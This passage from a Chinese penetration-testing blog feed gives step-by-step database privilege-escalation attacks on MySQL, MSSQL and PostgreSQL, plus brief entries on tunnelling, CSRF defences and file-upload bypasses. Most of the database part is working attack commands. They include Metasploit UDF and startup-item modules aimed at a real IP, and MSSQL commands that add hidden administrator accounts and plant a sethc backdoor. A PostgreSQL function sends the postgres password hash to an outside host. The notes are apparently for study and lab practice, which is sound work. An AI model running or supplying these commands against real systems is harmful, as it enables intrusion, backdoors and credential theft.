class="hljs-operator">*</span>.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;root密码&#x27;</span> <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">GRANT</span> OPTION;<br></code></pre></td></tr></table></figure><h5 id="4-MSF-UDF"><a href="#4-MSF-UDF" class="headerlink" title="4.MSF_UDF"></a>4.MSF_UDF</h5><p>MSF中有udf模块，dll中包含sys_exec()和sys_eval()两个函数，MSF只创建sys_exec()，sys_exec()不回显，所以还需要手工创建sys_eval()。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> exploit/multi/mysql/mysql_udf_payload<br><span class="hljs-keyword">set</span> ...<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval <span class="hljs-keyword">returns</span> string soname &quot;nqCFiHBv.dll&quot;;# 创建sys_eval函数<br><span class="hljs-keyword">select</span> sys_eval(&quot;whoami&quot;);# 命令执行<br></code></pre></td></tr></table></figure><h5 id="5-反弹shell"><a href="#5-反弹shell" class="headerlink" title="5.反弹shell"></a>5.反弹shell</h5><p>MSF中的dll自定义的函数是用来执行命令的，还可以其他dll来创建用来反弹shell的函数。</p><p>可用使用暗月MYSQL高版本提权工具进行反弹shell。</p><p><a href="https://blog.csdn.net/weixin_43801718/article/details/105493042?spm=1001.2014.3001.5501">https://blog.csdn.net/weixin_43801718/article/details/105493042?spm=1001.2014.3001.5501</a></p><p><a href="https://www.sqlsec.com/2020/11/mysql.html#%E5%8F%8D%E5%BC%B9%E7%AB%AF%E5%8F%A3%E6%8F%90%E6%9D%83">https://www.sqlsec.com/2020/11/mysql.html#%E5%8F%8D%E5%BC%B9%E7%AB%AF%E5%8F%A3%E6%8F%90%E6%9D%83</a></p><h4 id="2-启动项提权"><a href="#2-启动项提权" class="headerlink" title="2.启动项提权"></a>2.启动项提权</h4><p>MySql的文件写入功能 -&gt; 写入后门到启动项目录中 -&gt; 目标机器重启，执行后门，反弹shell</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">MSF -&gt; use exploit<span class="hljs-regexp">/windows/my</span>sql/mysql_start_up<br></code></pre></td></tr></table></figure><h4 id="3-MOF提权"><a href="#3-MOF提权" class="headerlink" title="3.MOF提权"></a>3.MOF提权</h4><p>MOF -&gt; 成功几率很小 2003</p><p>原理：C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; 目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">MSF -&gt; use exploit<span class="hljs-regexp">/windows/my</span>sql/mysql_mof<br></code></pre></td></tr></table></figure><h4 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h4><p>MySQL提权共3种方法，其实还是一种方法 -&gt; 利用MySQL文件写入的功能，所以限制就比较明显 -&gt; 文件写入的权限&amp;写入任意路径的权限。</p><h4 id="5-实操"><a href="#5-实操" class="headerlink" title="5.实操"></a>5.实操</h4><h5 id="1-UDF"><a href="#1-UDF" class="headerlink" title="1.UDF"></a>1.UDF</h5><h6 id="1-信息收集-1"><a href="#1-信息收集-1" class="headerlink" title="1.信息收集"></a>1.信息收集</h6><p>webshell连接数据库：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131201206945.png" alt="image-20230131201206945"></p><p>查看是否可写入文件？</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure%&#x27;</span>;<br></code></pre></td></tr></table></figure><p>可以看到 <code>secure_file_priv</code> 为空，满足条件，可以提权。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131201237872.png" alt="image-20230131201237872"></p><h6 id="2-开启外连"><a href="#2-开启外连" class="headerlink" title="2.开启外连"></a>2.开启外连</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;root&#x27; WITH GRANT OPTION;# 开启外连<br><br>SELECT * FROM mysql.user LIMIT 0,10;# 查看<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131173915674.png" alt="image-20230131173915674"></p><h6 id="3-MSF"><a href="#3-MSF" class="headerlink" title="3.MSF"></a>3.MSF</h6><p>use exploit&#x2F;multi&#x2F;mysql&#x2F;mysql_udf_payload</p><p>set RHOSTS 43.139.185.135</p><p>set PASSWORD root</p><p>run</p><p>No such file or directory，需要手工创建。使用MSF报错出路径再创建比较方便。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131202324155.png" alt="image-20230131202324155"></p><p>webshell创建文件夹：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131201842453.png" alt="image-20230131201842453"></p><p>run</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131202558414.png" alt="image-20230131202558414"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131202632942.png" alt="image-20230131202632942"></p><p>创建sys_eval：</p><p>create function sys_eval returns string soname “nqCFiHBv.dll”;# 创建sys_eval函数</p><p>select sys_eval(“whoami”);# 命令执行</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131202806186.png" alt="image-20230131202806186"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131202829764.png" alt="image-20230131202829764"></p><p>由于是phpstudy搭建的环境，所以权限是phpstudy获得的权限 -&gt; administrator，而不是system权限。</p><h6 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h6><p>dll文件中存在反弹shell的函数，从而实现反弹。</p><p><a href="https://www.sqlsec.com/2020/11/mysql.html#%E5%8F%8D%E5%BC%B9%E7%AB%AF%E5%8F%A3%E6%8F%90%E6%9D%83">https://www.sqlsec.com/2020/11/mysql.html#%E5%8F%8D%E5%BC%B9%E7%AB%AF%E5%8F%A3%E6%8F%90%E6%9D%83</a></p><p>工具：暗月MYSQL高版本提权工具</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201171614280.png" alt="image-20230201171614280"></p><h5 id="2-启动项"><a href="#2-启动项" class="headerlink" title="2.启动项"></a>2.启动项</h5><p>use exploit&#x2F;windows&#x2F;mysql&#x2F;mysql_start_up</p><p>set USERNAME root</p><p>set PASSWORD root</p><p>set RHOSTS 43.139.185.135</p><p>set DISABLEPAYLOADHANDLER false </p><p>run</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131222319329.png" alt="image-20230131222319329"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230131222059289.png" alt="image-20230131222059289"></p><h3 id="2-MSSQL"><a href="#2-MSSQL" class="headerlink" title="2.MSSQL"></a>2.MSSQL</h3><p>前提条件：sa用户</p><h4 id="1-xp-cmdshell"><a href="#1-xp-cmdshell" class="headerlink" title="1.xp_cmdshell"></a>1.xp_cmdshell</h4><p>xp_cmdshell -&gt; 可以执行系统命令</p><p>开启xp_cmdshell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mssql">EXEC sp_configure &#x27;show advanced options&#x27;, 1RECONFIGURE;<br>EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;<br>RECONFIGURE;<br></code></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">EXEC master.dbo.xp_cmdshell &#x27;whoami&#x27;;<br></code></pre></td></tr></table></figure><h4 id="2-sp-oacreate"><a href="#2-sp-oacreate" class="headerlink" title="2.sp_oacreate"></a>2.sp_oacreate</h4><p><code>sp_oacreate</code>可以删除、复制、移动文件，还能配合<code>sp_oamethod</code>来写文件执行<code>cmd</code>。</p><p><code>sp_oacreate</code>和<code>sp_oamethod</code>两个过程分别用来创建和执行脚本语言，换言之就是<code>xp_cmdshell</code>能执行的<code>sp_oacreate</code>＋<code>sp_oamethod</code>同样能胜任。但是使用此方法时<code>sp_oacreate</code>没有回显，所以一般用于<code>xp_cmdshell</code>无法使用时。</p><p>开启组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mssql">EXEC sp_configure &#x27;show advanced options&#x27;,1;<br>RECONFIGURE;EXEC sp_configure &#x27;Ole Automation Procedures&#x27;,1;<br>RECONFIGURE;<br></code></pre></td></tr></table></figure><p>调用cmd.exe执行命令并写入到test.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mssql">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod <br>@shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;d:/test.txt&#x27;<br></code></pre></td></tr></table></figure><h4 id="3-沙盒"><a href="#3-沙盒" class="headerlink" title="3.沙盒"></a>3.沙盒</h4><p>原理：本质是修改注册表，默认情况下，注册表中<code>mdb</code>数据库不允许执行系统命令，但是开启沙盒模式，就准许<code>mdb</code>文件执行数据库，通过查询方式调用<code>mdb</code>文件，执行参数，绕过系统本身自己的执行命令，实现<code>mdb</code>文件执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mssql">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;<br>exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;reconfigure;<br>--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。<br>exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0;<br>--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。<br>exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;;<br>--执行系统命令<br>select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user qianxun 123456 /add&quot;)&#x27;)<br>select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net localgroup administrators qianxun /add&quot;)&#x27;)<br><br>-- 恢复配置<br>exec master..xp_regwrite &#x27;HKEY_LOCALMACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,1;<br>exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,0;reconfigure;<br>exec sp_configure &#x27;show advanced options&#x27;,0;reconfigure;<br></code></pre></td></tr></table></figure><h4 id="4-JOB"><a href="#4-JOB" class="headerlink" title="4.JOB"></a>4.JOB</h4><p>原理是创建一个任务x，并执行命令，命令执行后的结果，将返回给文档q.txt</p><p>首先需要启动sqlagent服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">exec master.dbo.xp_servicecontrol &#x27;start&#x27;,&#x27;SQLSERVERAGENT&#x27;<br></code></pre></td></tr></table></figure><p>然后创建任务X，这里x为任务名称，并执行命令，命令执行后的结果，将返回给文本文档q.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mssql">use msdb<br>exec sp_delete_job null,&#x27;x&#x27;<br>exec sp_add_job &#x27;x&#x27;<br>exec sp_add_jobstep null,&#x27;x&#x27;,null,&#x27;1&#x27;,&#x27;cmdexec&#x27;,&#x27;cmd /c &quot;net user hack1 hack1 /add &amp;net localgroup administrators hack1 /add&gt;c:/q.txt&quot;&#x27;<br>exec sp_add_jobserver null,&#x27;x&#x27;,@@servername<br>exec sp_start_job &#x27;x&#x27;;<br></code></pre></td></tr></table></figure><h4 id="5-映像劫持"><a href="#5-映像劫持" class="headerlink" title="5.映像劫持"></a>5.映像劫持</h4><p>利用regwrite函数修改注册表，起到劫持作用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mssql">-- 查看xp_regwrite是否启用<br>select count(*) from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;xp_regwrite&#x27;<br>-- 开启regwrite<br>EXEC sp_configure &#x27;show advanced options&#x27;, 1<br>RECONFIGURE<br>EXEC sp_configure &#x27;xp_regwrite&#x27;,1<br>RECONFIGURE<br>-- 利用regwrite函数修改注册表进行劫持<br>EXEC master..xp_regwrite @rootkey=&#x27;HKEY_LOCAL_MACHINE&#x27;,@key=&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE&#x27;,@value_name=&#x27;Debugger&#x27;,@type=&#x27;REG_SZ&#x27;,@value=&#x27;c:\windows\system32\cmd.exe&#x27;<br>-- 查看是否劫持成功<br>exec master..xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#x27;,&#x27;Debugger&#x27;<br>-- 远程连接桌面，连续按五次shift就可调用cmd窗口<br></code></pre></td></tr></table></figure><h4 id="6-实操"><a href="#6-实操" class="headerlink" title="6.实操"></a>6.实操</h4><h5 id="1-xp-cmdshell-1"><a href="#1-xp-cmdshell-1" class="headerlink" title="1.xp_cmdshell"></a>1.xp_cmdshell</h5><p>Navicat连接，默认开启外连：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201172820986.png" alt="image-20230201172820986"></p><p>EXEC sp_configure ‘show advanced options’, 1RECONFIGURE;<br>EXEC sp_configure ‘xp_cmdshell’, 1;<br>RECONFIGURE;</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201173044181.png" alt="image-20230201173044181"></p><p>EXEC master.dbo.xp_cmdshell ‘whoami &#x2F;all’;</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201173241862.png" alt="image-20230201173241862"></p><h5 id="2-sp-oacreate-1"><a href="#2-sp-oacreate-1" class="headerlink" title="2.sp_oacreate"></a>2.sp_oacreate</h5><p>EXEC sp_configure ‘show advanced options’,1;<br>RECONFIGURE;EXEC sp_configure ‘Ole Automation Procedures’,1;<br>RECONFIGURE;</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201174014723.png" alt="image-20230201174014723"></p><p>declare @shell int exec sp_oacreate ‘wscript.shell’,@shell output exec sp_oamethod<br>@shell,’run’,null,’c:\windows\system32\cmd.exe &#x2F;c whoami &gt;d:&#x2F;test.txt’</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201174305333.png" alt="image-20230201174305333"></p><h5 id="3-其他"><a href="#3-其他" class="headerlink" title="3.其他"></a>3.其他</h5><p>其他方法无法成功，可能是安装出了问题或者没有权限。</p><h3 id="3-oracle"><a href="#3-oracle" class="headerlink" title="3.oracle"></a>3.oracle</h3><p>java一般是system权限运行，所以oracle一般直接得到最高权限。</p><p>工具：oracleShell</p><p>地址：<a href="https://github.com/jas502n/oracleShell">https://github.com/jas502n/oracleShell</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201182018938.png" alt="image-20230201182018938"></p><h3 id="4-PostgreSQL"><a href="#4-PostgreSQL" class="headerlink" title="4.PostgreSQL"></a>4.PostgreSQL</h3><p>PostgreSQL提权主要是靠2个Nday：</p><ol><li>CVE-2018-1058 PostgreSQL 提权漏洞 -&gt; 普通用户连接到数据库—&gt;注入危险代码—&gt;等待超级用户登录触发后门—&gt;收到敏感信息</li><li>CVE-2019-9193 高级权限命令执行漏洞</li></ol><p>登录：psql –host your-ip –username vulhub</p><h4 id="1-CVE-2018-1058"><a href="#1-CVE-2018-1058" class="headerlink" title="1.CVE-2018-1058"></a>1.CVE-2018-1058</h4><p>影响版本：9.3到10</p><p>普通用户连接到数据库—&gt;注入危险代码—&gt;等待超级用户登录触发后门—&gt;收到敏感信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> public.array_to_string(anyarray,text) <span class="hljs-keyword">RETURNS</span> TEXT <span class="hljs-keyword">AS</span> $$<br>    <span class="hljs-keyword">select</span> dblink_connect((<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;hostaddr=IP地址 port=端口 user=postgres password=chybeta sslmode=disable dbname=&#x27;</span><span class="hljs-operator">||</span>(<span class="hljs-keyword">SELECT</span> passwd <span class="hljs-keyword">FROM</span> pg_shadow <span class="hljs-keyword">WHERE</span> usename<span class="hljs-operator">=</span><span class="hljs-string">&#x27;postgres&#x27;</span>))); <br>    <span class="hljs-keyword">SELECT</span> pg_catalog.array_to_string($<span class="hljs-number">1</span>,$<span class="hljs-number">2</span>);<br>$$ <span class="hljs-keyword">LANGUAGE</span> <span class="hljs-keyword">SQL</span> VOLATILE;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc lvvp 端口<br></code></pre></td></tr></table></figure><p><a href="https://vulhub.org/#/environments/postgres/CVE-2018-1058/">https://vulhub.org/#/environments/postgres/CVE-2018-1058/</a></p><p><a href="https://blog.csdn.net/q943111495/article/details/121032338">https://blog.csdn.net/q943111495/article/details/121032338</a> </p><h4 id="2-CVE-2019-9193"><a href="#2-CVE-2019-9193" class="headerlink" title="2.CVE-2019-9193"></a>2.CVE-2019-9193</h4><p>从9.3版本开始，Postgres新增了一个<code>COPY TO/FROM PROGRAM</code>功能，允许数据库的超级用户以及<code>pg_read_server_files</code>组中的任何用户执行操作系统命令。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> cmd_exec;<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> cmd_exec(cmd_output text);<br><span class="hljs-keyword">COPY</span> cmd_exec <span class="hljs-keyword">FROM</span> PROGRAM <span class="hljs-string">&#x27;id&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> cmd_exec;<br></code></pre></td></tr></table></figure><p><a href="https://vulhub.org/#/environments/postgres/CVE-2019-9193/">https://vulhub.org/#/environments/postgres/CVE-2019-9193/</a></p><p><a href="https://cloud.tencent.com/developer/article/1472565">https://cloud.tencent.com/developer/article/1472565</a></p><h4 id="3-实操"><a href="#3-实操" class="headerlink" title="3.实操"></a>3.实操</h4><h5 id="1-CVE-2018-1058-1"><a href="#1-CVE-2018-1058-1" class="headerlink" title="1.CVE-2018-1058"></a>1.CVE-2018-1058</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> public.array_to_string(anyarray,text) <span class="hljs-keyword">RETURNS</span> TEXT <span class="hljs-keyword">AS</span> $$<br>    <span class="hljs-keyword">select</span> dblink_connect((<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;hostaddr=43.140.192.244 port=4444 user=postgres password=chybeta sslmode=disable dbname=&#x27;</span><span class="hljs-operator">||</span>(<span class="hljs-keyword">SELECT</span> passwd <span class="hljs-keyword">FROM</span> pg_shadow <span class="hljs-keyword">WHERE</span> usename<span class="hljs-operator">=</span><span class="hljs-string">&#x27;postgres&#x27;</span>))); <br>    <span class="hljs-keyword">SELECT</span> pg_catalog.array_to_string($<span class="hljs-number">1</span>,$<span class="hljs-number">2</span>);<br>$$ <span class="hljs-keyword">LANGUAGE</span> <span class="hljs-keyword">SQL</span> VOLATILE;<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201190453256.png" alt="image-20230201190453256"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201190544182.png" alt="image-20230201190544182"></p><h5 id="2-CVE-2019-9193-1"><a href="#2-CVE-2019-9193-1" class="headerlink" title="2.CVE-2019-9193"></a>2.CVE-2019-9193</h5><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230201191002084.png" alt="image-20230201191002084"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网穿透</title>
    <link href="/2023/07/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%A9%BF%E9%80%8F%E4%B8%8A%E7%BA%BF/"/>
    <url>/2023/07/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%A9%BF%E9%80%8F%E4%B8%8A%E7%BA%BF/</url>
    
    <content type="html"><![CDATA[<h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><p>内网穿透解决的是在当前局域网去上线另一局域网的主机的问题。</p><p>原理：2 台内网机器都能访问公网机器，那么将 1 台内网机器映射到公网的某个端口上，然后另一条内网机器就可以访问该端口与其建立连接。</p><h2 id="ngrok"><a href="#ngrok" class="headerlink" title="ngrok"></a>ngrok</h2><p>项目地址：<a href="https://www.ngrok.cc/">https://www.ngrok.cc/</a></p><p>该项目是一个在线平台，不需要我们自己搭建。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSRF跨站请求伪造</title>
    <link href="/2023/07/11/WEB%E6%BC%8F%E6%B4%9E/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
    <url>/2023/07/11/WEB%E6%BC%8F%E6%B4%9E/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a>CSRF跨站请求伪造</h1><p>漏洞原理：伪装成受信任用户请求受信任的网站，其实就是攻击者利用目标用户的身份，以目标用户的名义执行某些非法操作。其也被称为 <code>One Click Attack</code>。</p><p>漏洞成因：网站的身份验证机制有一定问题，它无法判断该操作是否由该用户执行。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309081042333.png" alt="image-20230908104245281"></p><p>漏洞利用：BurpSuite 中右键生成 CSRF POC 即可</p><p>CSRF 可以和 XSS 形成组合拳，如 XSS 自动调用 CSRF POC，或者 CSRF 自动构造存储 XSS 等等。</p><p>漏洞修复：</p><ol><li><p>增加 Token 验证（常用做法），对关键操作增加 Token 参数，token 必须随机，每次都不一样</p></li><li><p>关于安全的会话管理（避免会话被利用）</p><ol><li>不要在客户端保存敏感信息（比如身份验证信息）</li><li>退出、关闭浏览器时的会话过期机制</li><li>设置会话过机制，比如 15 分钟无操作，则自动登录超时</li></ol></li><li><p>访问控制安全管理</p><ol><li>敏感信息的修改时需要身份进行二次认证，比如修改账号密码，需要判断旧 密码</li><li>敏感信息的修改使用 POST，而不是 GET</li><li>通过 HTTP 头部中的 REFERER 来限制原页面</li></ol></li><li><p>增加验证码，一般在登录（防暴力破解），也可以用在其他重要信息操作的表单中（需要考虑可用性）</p></li></ol><p>修复介绍：</p><ul><li>网站要执行某操作，先请求服务器获取 Token，然后携带该 Token 去执行操作，执行后 Token 失效</li><li>REFERER 表示网站来源，CSRF 构造的请求来源自然是一个恶意的网站，则 REFERER 不符合</li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>WEB漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>任意文件上传</title>
    <link href="/2023/07/11/WEB%E6%BC%8F%E6%B4%9E/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2023/07/11/WEB%E6%BC%8F%E6%B4%9E/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>服务端对文件上传的类型未做限制或者不严谨导致攻击者可以上传其他类型的文件。</p><p>通常是尝试上传服务端可解析的脚本文件，也就是 webShell，来拿到网站权限。</p><p>不过也可以根据情况来有一些其他的利用：</p><ul><li>上传 <code>svg、html</code> 等造成 XSS 跨站</li><li>上传一个超大的文件，造成拒绝服务漏洞</li></ul><p>该漏洞需要考虑的是如何去绕过上传限制，从而上传 <code>webshell</code>，所以是从文件上传过滤来入手。</p><h2 id="上传过滤"><a href="#上传过滤" class="headerlink" title="上传过滤"></a>上传过滤</h2><ul><li>后缀名过滤<ul><li>前端</li><li>白名单</li><li>黑名单</li></ul></li><li>文件内容过滤<ul><li>MIME</li><li>文件头</li><li>关键字</li></ul></li></ul><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="后缀名过滤"><a href="#后缀名过滤" class="headerlink" title="后缀名过滤"></a>后缀名过滤</h3><h4 id="前端过滤"><a href="#前端过滤" class="headerlink" title="前端过滤"></a>前端过滤</h4><ul><li>禁用 、修改 JS</li><li>合法后缀上传，抓包修改文件名</li></ul><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><p>黑名单就是应用程序定义一个不允许上传的后缀名列表，然后获取上传文件的后缀，与之进行匹配，在黑名单中就禁止上传。</p><ul><li>特殊可解析后缀</li><li>点绕过</li><li>大小写绕过</li><li>双写绕过</li><li>空格绕过</li><li>文件名可控绕过</li><li><code>::$DATA</code> </li><li><code>.user.ini</code> </li><li><code>.htaccess</code></li></ul><h5 id="DATA"><a href="#DATA" class="headerlink" title="::$DATA"></a><code>::$DATA</code></h5><p>在 windows 环境中会把 <code>::$DATA</code> 之后的数据当文件流处理，而不是属于文件名。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">shell.php::<span class="hljs-variable">$DATA</span>.png<br></code></pre></td></tr></table></figure><h5 